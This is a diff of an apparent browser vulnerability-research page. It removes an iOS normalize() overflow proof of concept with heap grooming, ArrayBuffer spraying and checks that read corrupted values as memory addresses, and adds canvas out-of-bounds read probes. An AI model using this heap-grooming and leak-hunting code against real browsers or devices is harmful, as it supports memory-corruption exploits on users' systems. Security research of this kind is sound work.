@@ -1,154 +1,175 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>iOS normalize() Groomed Overflow</title>
-</head>
 <body>
-<button onclick="test()">تشغيل: Groomed Overflow</button>
-<pre id="log" style="white-space:pre-wrap;word-break:break-all;font-size:11px;"></pre>
+<button onclick="test()">اختبار: Canvas OOB Read</button>
+<pre id="log" style="font-size:11px;"></pre>
 <script>
-function log(m){document.getElementById('log').textContent+=m+'\n';}
-function cp(s){try{localStorage.setItem('cp',s);}catch(e){}}
+function log(m) { document.getElementById('log').textContent += m + '\n'; }
 
-async function test(){
-    log('=== iOS Groomed normalize() Overflow ===');
-    cp('START');
+function test() {
+    log('=== Canvas OOB Read Test ===');
 
-    // حجم التجاوز الدقيق
-    const N = 238609295;
-    log('[1] إنشاء النص (' + N + ' حرف = ~457MB)...');
-    cp('STR_CREATE');
-
-    let str;
+    // ===== الاختبار 1: getImageData بحدود سالبة =====
+    log('\n--- Test 1: getImageData بحدود سالبة ---');
     try {
-        str = '\uFDFA'.repeat(N);
-        log('[+] تم! الطول: ' + str.length);
-    } catch(e) {
-        log('[X] فشل إنشاء النص: ' + e.message);
-        log('[X] الجهاز لا يملك ذاكرة كافية');
-        return;
-    }
-    cp('STR_OK');
+        var c1 = document.createElement('canvas');
+        c1.width = 100; c1.height = 100;
+        var ctx1 = c1.getContext('2d');
 
-    // Heap Grooming: إنشاء ثقوب بحجم 28 بايت
-    log('[2] تهيئة الكومة (Heap Grooming)...');
-    let sprays = [];
-    for (let i = 0; i < 5000; i++) {
-        sprays.push(new ArrayBuffer(28)); // نفس حجم buffer الـ 14 حرف
-    }
-    log('[+] تم إنشاء ' + sprays.length + ' ArrayBuffer (28 بايت)');
+        // املأ Canvas بلون معروف
+        ctx1.fillStyle = 'rgb(255,0,0)';
+        ctx1.fillRect(0, 0, 100, 100);
 
-    // حرر نصفها لخلق ثقوب
-    for (let i = 0; i < sprays.length; i += 2) {
-        sprays[i] = null;
-    }
-    log('[+] تم تحرير النصف لخلق ثقوب');
+        // جرّب إحداثيات سالبة
+        var tests = [
+            [-1, 0, 10, 10],
+            [0, -1, 10, 10],
+            [0, 0, -1, 10],
+            [0, 0, 10, -1],
+            [-10, -10, 200, 200],
+            [50, 50, 100, 100],
+            [0, 0, 100, 100],
+            [99, 99, 2, 2],
+            [100, 100, 1, 1],
+        ];
 
-    // spray آخر بـ Float64Array لمراقبة التلف
-    let monitors = [];
-    for (let i = 0; i < 100; i++) {
-        let buf = new ArrayBuffer(64);
-        let view = new Float64Array(buf);
-        view[0] = 1.337; // قيمة مميزة
-        view[1] = 2.718;
-        view[2] = 3.141;
-        monitors.push({buf, view, original: [view[0], view[1], view[2]]});
-    }
-    log('[+] تم إنشاء ' + monitors.length + ' Float64Array مراقب');
-
-    // إجبار GC لتنظيف الثقوب
-    if (typeof gc === 'function') { gc(); gc(); }
-    else { for(let i=0;i<100;i++) new ArrayBuffer(1024); }
-    log('[+] GC تم');
-
-    // الآن استدعِ normalize()
-    log('[3] استدعاء normalize("NFKC")...');
-    cp('CALL_NORMALIZE');
-
-    let result = null;
-    try {
-        result = str.normalize("NFKC");
-        cp('NORMALIZE_OK');
-        log('[+] normalize() عادت! الطول: ' + result.length);
-    } catch(e) {
-        cp('NORMALIZE_THROW:' + e.message);
-        log('[!] normalize() رمى استثناء: ' + e.message);
-        log('[!] هذا قد يعني أن الـ OOB Write حدث وتم التقاطه');
-    }
-
-    // فحص الـ monitors هل تلف أي منها؟
-    log('[4] فحص Float64Array المراقبين...');
-    let corrupted = 0;
-    for (let i = 0; i < monitors.length; i++) {
-        let m = monitors[i];
-        try {
-            let v0 = m.view[0], v1 = m.view[1], v2 = m.view[2];
-            if (v0 !== m.original[0] || v1 !== m.original[1] || v2 !== m.original[2]) {
-                corrupted++;
-                log('[!] Monitor #' + i + ' CORRUPTED!');
-                log('    قبل: ' + m.original[0] + ', ' + m.original[1] + ', ' + m.original[2]);
-                log('    بعد: ' + v0 + ', ' + v1 + ', ' + v2);
-
-                // لو القيم الجديدة تبدو كعنوان ذاكرة
-                let buf = new ArrayBuffer(8);
-                new Float64Array(buf)[0] = v0;
-                let low = new Uint32Array(buf)[0];
-                let high = new Uint32Array(buf)[1];
-                let addr = (BigInt(high) << 32n) | BigInt(low);
-                log('    v0 كعنوان: 0x' + addr.toString(16));
-            }
-        } catch(e) {
-            corrupted++;
-            log('[!] Monitor #' + i + ' CRASH على القراءة: ' + e.message);
-        }
-    }
-
-    log('[*] Monitors تالفة: ' + corrupted + '/' + monitors.length);
-
-    // لو عندنا نتيجة normalize، افحصها
-    if (result && result.length > 0 && result.length < 100) {
-        log('[5] فحص نتيجة normalize()...');
-        log('[!] الطول قصير: ' + result.length);
-        let hex = [];
-        for (let i = 0; i < result.length; i++) {
-            hex.push(result.charCodeAt(i).toString(16).padStart(4, '0'));
-        }
-        log('[!] Hex: ' + hex.join(' '));
-
-        // ابحث عن قيم تبدو كعنوان
-        for (let i = 0; i < result.length - 3; i++) {
-            let val = result.charCodeAt(i) | (result.charCodeAt(i+1) << 16);
-            if (val > 0x10000) {
-                log('[?] قيمة مشبوهة عند index ' + i + ': 0x' + val.toString(16));
-            }
-        }
-    }
-
-    // فحص الـ sprays المتبقية
-    log('[6] فحص ArrayBuffers المتبقية...');
-    let sprayCorrupted = 0;
-    for (let i = 1; i < sprays.length; i += 2) {
-        if (sprays[i]) {
-            let view = new Uint8Array(sprays[i]);
-            let nonZero = 0;
-            for (let j = 0; j < 28; j++) {
-                if (view[j] !== 0) nonZero++;
-            }
-            if (nonZero > 0 && nonZero < 28) {
-                sprayCorrupted++;
-                if (sprayCorrupted <= 3) {
-                    let hex = [];
-                    for (let j = 0; j < 28; j++) hex.push(view[j].toString(16).padStart(2,'0'));
-                    log('[!] Spray #' + i + ' يحتوي بيانات: ' + hex.join(' '));
+        tests.forEach(function(t, i) {
+            try {
+                var img = ctx1.getImageData(t[0], t[1], t[2], t[3]);
+                log('  [' + i + '] getImageData(' + t + ') → ' + img.width + 'x' + img.height + ' len=' + img.data.length);
+                // افحص أول 4 بكسلات
+                var d = img.data;
+                var hex = [];
+                for (var j = 0; j < Math.min(d.length, 16); j++) {
+                    hex.push(d[j].toString(16).padStart(2, '0'));
                 }
+                log('    first bytes: ' + hex.join(' '));
+            } catch(e) {
+                log('  [' + i + '] getImageData(' + t + ') → ERROR: ' + e.message);
             }
-        }
-    }
-    log('[*] Sprays تالفة: ' + sprayCorrupted);
+        });
+    } catch(e) { log('  Test1 ERROR: ' + e); }
 
-    cp('DONE');
-    log('=== انتهى ===');
+    // ===== الاختبار 2: Canvas كبير ثم تصغير =====
+    log('\n--- Test 2: Canvas resize ثم قراءة ---');
+    try {
+        var c2 = document.createElement('canvas');
+        c2.width = 1000; c2.height = 1000;
+        var ctx2 = c2.getContext('2d');
+
+        // املأ ببيانات معروفة
+        var imgData = ctx2.createImageData(1000, 1000);
+        for (var i = 0; i < imgData.data.length; i += 4) {
+            imgData.data[i] = 0xAA;     // R
+            imgData.data[i+1] = 0xBB;   // G
+            imgData.data[i+2] = 0xCC;   // B
+            imgData.data[i+3] = 0xFF;   // A
+        }
+        ctx2.putImageData(imgData, 0, 0);
+
+        // صغّر Canvas
+        c2.width = 10;
+        c2.height = 10;
+
+        // اقرأ البيانات — هل نقرأ ذاكرة قديمة؟
+        var ctx2b = c2.getContext('2d');
+        var img2 = ctx2b.getImageData(0, 0, 10, 10);
+        var d2 = img2.data;
+        var hex2 = [];
+        for (var i = 0; i < Math.min(d2.length, 40); i++) {
+            hex2.push(d2[i].toString(16).padStart(2, '0'));
+        }
+        log('  بعد تصغير: ' + hex2.join(' '));
+
+        // هل البيانات = 0 (مصفرة) أم AA BB CC FF (قديمة) أم garbage؟
+        var allZero = true, allOld = true;
+        for (var i = 0; i < d2.length; i += 4) {
+            if (d2[i] !== 0) allZero = false;
+            if (d2[i] !== 0xAA || d2[i+1] !== 0xBB) allOld = false;
+        }
+        if (allZero) log('  → الذاكرة مُصفّرة (safe)');
+        else if (allOld) log('  → الذاكرة قديمة! (potential leak)');
+        else log('  → بيانات غريبة! (possible OOB read)');
+    } catch(e) { log('  Test2 ERROR: ' + e); }
+
+    // ===== الاختبار 3: putImageData بمصدر أصغر =====
+    log('\n--- Test 3: putImageData بمصدر أصغر من الوجهة ---');
+    try {
+        var c3 = document.createElement('canvas');
+        c3.width = 100; c3.height = 100;
+        var ctx3 = c3.getContext('2d');
+
+        // أنشئ ImageData صغير (10x10)
+        var small = ctx3.createImageData(10, 10);
+        for (var i = 0; i < small.data.length; i += 4) {
+            small.data[i] = 0x41; // A
+            small.data[i+1] = 0x42; // B
+            small.data[i+2] = 0x43; // C
+            small.data[i+3] = 0xFF;
+        }
+
+        // ضع في إزاحة كبيرة
+        ctx3.putImageData(small, 95, 95);
+
+        // اقرأ المنطقة المجاورة
+        var img3 = ctx3.getImageData(90, 90, 10, 10);
+        var d3 = img3.data;
+        var hex3 = [];
+        for (var i = 0; i < d3.length; i++) {
+            hex3.push(d3[i].toString(16).padStart(2, '0'));
+        }
+        log('  المنطقة المجاورة: ' + hex3.join(' '));
+    } catch(e) { log('  Test3 ERROR: ' + e); }
+
+    // ===== الاختبار 4: drawImage بمصدر محذوف =====
+    log('\n--- Test 4: drawImage ثم قراءة ---');
+    try {
+        var c4 = document.createElement('canvas');
+        c4.width = 100; c4.height = 100;
+        var ctx4 = c4.getContext('2d');
+
+        // أنشئ canvas مصدر
+        var src = document.createElement('canvas');
+        src.width = 100; src.height = 100;
+        var srcCtx = src.getContext('2d');
+        srcCtx.fillStyle = 'rgb(0,255,0)';
+        srcCtx.fillRect(0, 0, 100, 100);
+
+        // ارسم المصدر على الوجهة
+        ctx4.drawImage(src, 0, 0);
+
+        // احذف المصدر
+        src = null;
+
+        // اقرأ الوجهة
+        var img4 = ctx4.getImageData(0, 0, 100, 100);
+        var d4 = img4.data;
+        var first4 = [d4[0], d4[1], d4[2], d4[3]];
+        log('  أول بكسل: ' + first4.join(','));
+        if (d4[1] === 255) log('  → أخضر (صحيح)');
+        else log('  → بيانات غريبة! (possible leak)');
+    } catch(e) { log('  Test4 ERROR: ' + e); }
+
+    // ===== الاختبار 5: ImageData بحجم كبير جداً =====
+    log('\n--- Test 5: ImageData بحجم كبير ---');
+    try {
+        var c5 = document.createElement('canvas');
+        c5.width = 1; c5.height = 1;
+        var ctx5 = c5.getContext('2d');
+
+        // جرّب أحجام كبيرة
+        var sizes = [0x7FFFFFFF, 0xFFFFFFFF, 0x10000, 0x100000];
+        sizes.forEach(function(sz, i) {
+            try {
+                var big = ctx5.createImageData(sz, 1);
+                log('  [' + i + '] createImageData(' + sz + ', 1) → len=' + big.data.length);
+            } catch(e) {
+                log('  [' + i + '] createImageData(' + sz + ', 1) → ERROR: ' + e.message);
+            }
+        });
+    } catch(e) { log('  Test5 ERROR: ' + e); }
+
+    log('\n=== انتهى ===');
 }
 </script>
 </body>
